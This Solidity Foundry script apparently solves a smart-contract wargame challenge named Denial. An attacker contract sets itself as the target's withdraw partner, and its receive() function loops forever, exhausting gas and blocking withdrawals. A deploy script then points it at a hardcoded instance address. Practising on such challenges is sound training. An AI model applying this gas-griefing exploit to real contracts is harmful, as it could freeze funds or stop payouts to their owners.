//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;

import "../src/Denial.sol";
import "forge-std/Script.sol";

contract AttackDenial {
    function setPartner(Denial denial) public {
        denial.setWithdrawPartner(address(this));
    }
    receive() external payable {
        while(true) {}
    }
}

contract DenialSolution is Script {
    Denial public denialInstance = Denial(payable(0x0c49511429317D3B4E308Eab5185090c1Fe752BC));
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackDenial attackDenial = new AttackDenial();
        attackDenial.setPartner(denialInstance);
        vm.stopBroadcast();
    }
}